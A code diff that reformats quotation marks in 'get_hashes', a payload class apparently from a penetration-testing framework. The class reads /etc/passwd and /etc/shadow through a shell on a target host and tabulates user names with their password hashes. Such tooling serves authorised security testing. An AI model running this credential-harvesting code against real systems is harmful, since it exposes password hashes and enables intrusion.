@@ -6,18 +6,19 @@ class get_hashes(Payload):
     """
     Get the hashes from the /etc/shadow and /etc/passwd files (if any).
     """
+
     def api_read(self):
         result = {}
 
-        passwd = self.shell.read('/etc/passwd')
-        shadow = self.shell.read('/etc/shadow')
+        passwd = self.shell.read("/etc/passwd")
+        shadow = self.shell.read("/etc/shadow")
 
         def get_hash_list(input_file):
             result = []
-            for line in input_file.split('\n'):
+            for line in input_file.split("\n"):
                 try:
-                    user = line.split(':')[0]
-                    uhash = line.split(':')[1]
+                    user = line.split(":")[0]
+                    uhash = line.split(":")[1]
                 except:
                     pass
                 else:
@@ -38,10 +39,10 @@ class get_hashes(Payload):
         api_result = self.api_read()
 
         if not api_result:
-            return 'No hashes were found.'
+            return "No hashes were found."
         else:
             rows = []
-            rows.append(['User', 'Hash'])
+            rows.append(["User", "Hash"])
             rows.append([])
             for user, uhash in list(api_result.items()):
                 rows.append([user, uhash])
